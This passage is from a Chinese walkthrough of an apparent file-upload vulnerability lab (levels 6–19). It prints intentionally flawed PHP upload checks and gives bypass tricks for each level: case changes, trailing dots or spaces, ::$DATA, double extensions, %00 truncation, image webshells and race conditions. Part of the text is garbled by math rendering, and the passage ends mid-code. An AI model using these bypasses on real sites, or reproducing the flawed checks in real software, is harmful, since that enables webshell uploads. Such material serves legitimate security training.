<li>我之前用的是php-5.4.45，在我查看其phpinfo后找到了原因，因为使用的API不是FastCGI。我把phpstudy上的几个版本都尝试了一下，带nts的能成功，不带nts的则失败。</li>
</ul>
<h1 id="pass-6-大小写绕过">Pass-6-大小写绕过</h1>
<ul>
<li>代码</li>
</ul>
<pre><code>$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
</code></pre>
<ul>
<li>没有进行大小写过滤，直接.PHP上传。</li>
</ul>
<h1 id="pass-7-空格绕过">Pass-7-空格绕过</h1>
<ul>
<li>代码</li>
</ul>
<pre><code>$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
</code></pre>
<ul>
<li>没有进行首位去空，在(.php)后面加上空格(.php )上传</li>
</ul>
<h1 id="pass-8-点绕过">Pass-8-点绕过</h1>
<ul>
<li>代码：</li>
</ul>
<pre><code>$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
</code></pre>
<ul>
<li>这一关利用了win特性，会自动去除掉后缀名中的”.”，可在后缀名中加”.”绕过。</li>
</ul>
<h1 id="pass-9-data绕过">Pass-9-::$DATA绕过</h1>
<ul>
<li>代码：</li>
</ul>
<pre><code>$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
</code></pre>
<ul>
<li>没有对后缀名中的’::<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mi mathvariant="normal">’</mi><mi mathvariant="normal">进</mi><mi mathvariant="normal">行</mi><mi mathvariant="normal">过</mi><mi mathvariant="normal">滤</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">在</mi><mi>p</mi><mi>h</mi><mi>p</mi><mo>+</mo><mi>w</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>w</mi><mi>s</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">情</mi><mi mathvariant="normal">况</mi><mi mathvariant="normal">下</mi><mi mathvariant="normal">：</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">果</mi><mi mathvariant="normal">文</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">名</mi><mo>+</mo><mi mathvariant="normal">&quot;</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATA’进行过滤。在php+windows的情况下：如果文件名+&quot;::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">A</span><span class="mord">’</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">滤</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">在</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">情</span><span class="mord cjk_fallback">况</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">名</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span></span></span>DATA&quot;会把::<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mi mathvariant="normal">之</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">据</mi><mi mathvariant="normal">当</mi><mi mathvariant="normal">成</mi><mi mathvariant="normal">文</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">流</mi><mi mathvariant="normal">处</mi><mi mathvariant="normal">理</mi><mo separator="true">,</mo><mi mathvariant="normal">不</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">检</mi><mi mathvariant="normal">测</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">缀</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">且</mi><mi mathvariant="normal">保</mi><mi mathvariant="normal">持</mi><mi mathvariant="normal">&quot;</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">A</span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">据</span><span class="mord cjk_fallback">当</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">流</span><span class="mord cjk_fallback">处</span><span class="mord cjk_fallback">理</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">检</span><span class="mord cjk_fallback">测</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">缀</span><span class="mord cjk_fallback">名</span><span class="mord">.</span><span class="mord cjk_fallback">且</span><span class="mord cjk_fallback">保</span><span class="mord cjk_fallback">持</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span></span></span>DATA&quot;之前的文件名。利用windows特性，可在后缀名中加” ::$DATA”绕过。</li>
</ul>
<h1 id="pass-10-点空格点绕过">Pass-10-点+空格+点绕过</h1>
<ul>
<li>代码：</li>
</ul>
<pre><code>$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
</code></pre>
<ul>
<li>代码先是去除文件名前后的&quot;空格&quot;，再去除文件名最后所有的&quot;.&quot;，再通过strrchar函数来寻找&quot;.&quot;来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过。</li>
</ul>
<h1 id="pass-11-双写绕过">Pass-11-双写绕过</h1>
<ul>
<li>代码：</li>
</ul>
<pre><code>$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;);

        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH.'/'.$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
</code></pre>
<ul>
<li>黑名单过滤，将黑名单里的后缀名替换为空且只替换一次，因此可以用双写绕过</li>
</ul>
<h1 id="pass-12-get型00截断绕过">Pass-12-GET型00截断绕过</h1>
<ul>
<li>代码：</li>
</ul>
<pre><code>$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else{
        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
    }
}
</code></pre>
<ul>
<li>白名单判断，但$img_path是直接拼接，因此可以利用%00截断绕过。</li>
<li>截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态。</li>
</ul>
<pre><code>$img_path = $_GET['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
</code></pre>
<h1 id="pass-13-post型00截断绕过">Pass-13-POST型00截断绕过</h1>
<ul>
<li>代码：</li>
</ul>
<pre><code>$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_POST['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = &quot;上传失败&quot;;
        }
    } else {
        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
    }
}
</code></pre>
<ul>
<li>save_path参数通过POST方式传递，还是利用00截断，因为POST不会像GET对%00进行自动解码，所以需要在二进制中进行修改。</li>
</ul>
<h1 id="pass-14-图片马绕过">Pass-14-图片马绕过</h1>
<ul>
<li>代码：</li>
</ul>
<pre><code>function getReailFileType($filename){
    $file = fopen($filename, &quot;rb&quot;);
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
    $fileType = '';    
    switch($typeCode){      
        case 255216:            
            $fileType = 'jpg';
            break;
        case 13780:            
            $fileType = 'png';
            break;        
        case 7173:            
            $fileType = 'gif';
            break;
        default:            
            $fileType = 'unknown';
        }    
        return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_type = getReailFileType($temp_file);

    if($file_type == 'unknown'){
        $msg = &quot;文件未知，上传失败！&quot;;
    }else{
        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = &quot;上传出错！&quot;;
        }
    }
}
</code></pre>
<ul>
<li>
<p>通过读文件的前2个字节判断文件类型，因此直接上传图片马即可，制作图片马：</p>
</li>
<li>
<p>直接访问图片并不能把图片当做PHP解析，因此还需要利用文件包含漏洞。</p>
</li>
</ul>
<h1 id="pass-15-getimagesize-图片马绕过">Pass-15-getimagesize()-图片马绕过</h1>
<ul>
<li>代码：</li>
</ul>
<pre><code>function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)&gt;=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = &quot;文件未知，上传失败！&quot;;
    }else{
        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = &quot;上传出错！&quot;;
        }
    }
}
</code></pre>
<ul>
<li>这题是用getimagesize函数判断文件类型，还是可以图片马绕过，方法同pass-14</li>
</ul>
<h1 id="pass-16-exif_imagetype-图片马绕过">Pass-16-exif_imagetype()-图片马绕过</h1>
<ul>
<li>代码：</li>
</ul>
<pre><code>function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return &quot;gif&quot;;
            break;
        case IMAGETYPE_JPEG:
            return &quot;jpg&quot;;
            break;
        case IMAGETYPE_PNG:
            return &quot;png&quot;;
            break;    
        default:
            return false;
            break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = &quot;文件未知，上传失败！&quot;;
    }else{
        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = &quot;上传出错！&quot;;
        }
    }
}
</code></pre>
<ul>
<li>这里用到php_exif模块来判断文件类型，用图片马绕过，方法同pass-14.</li>
</ul>
<h1 id="pass-17-二次渲染绕过">Pass-17-二次渲染绕过</h1>
<ul>
<li>代码：</li>
</ul>
<pre><code>$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,&quot;.&quot;),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = &quot;该文件不是jpg格式的图片！&quot;;
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).&quot;.jpg&quot;;
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = &quot;上传出错！&quot;;
        }

    }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = &quot;该文件不是png格式的图片！&quot;;
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).&quot;.png&quot;;
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = &quot;上传出错！&quot;;
        }

    }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = &quot;该文件不是gif格式的图片！&quot;;
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).&quot;.gif&quot;;
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = &quot;上传出错！&quot;;
        }
    }else{
        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;
    }
}
</code></pre>
<ul>
<li>判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染，具体可以参考这篇文章，可是在复现的时候还是因为二次渲染以后php代码还是出被修改。</li>
</ul>
<h1 id="pass-18-条件竞争绕过">Pass-18-条件竞争绕过</h1>
<ul>
<li>代码：</li>
</ul>
<pre><code>$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
</code></pre>
<ul>
<li>这里是条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除，因此我们可以上传1.php只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可。</li>
</ul>
<h1 id="pass-19-条件竞争apache文件解析漏洞绕过">Pass-19-条件竞争&amp;Apache文件解析漏洞绕过</h1>
<ul>
<li>代码：</li>
</ul>
<pre><code>//index.php
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once(&quot;./myupload.php&quot;);
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u-&gt;upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
            break; 
        case -2:
            $msg = '上传失败，上传目录不可写。';
            break; 
        case -3:
            $msg = '上传失败，无法上传该类型文件。';
            break; 
        case -4:
            $msg = '上传失败，上传的文件过大。';
            break; 
        case -5:
            $msg = '上传失败，服务器已经存在相同名称文件。';
            break; 
        case -6:
            $msg = '文件无法上传，文件不能复制到目标目录。';
            break;      
        default:
            $msg = '未知错误！';
            break;
    }
}

//myupload.php
class MyUpload{
......
......
...... 
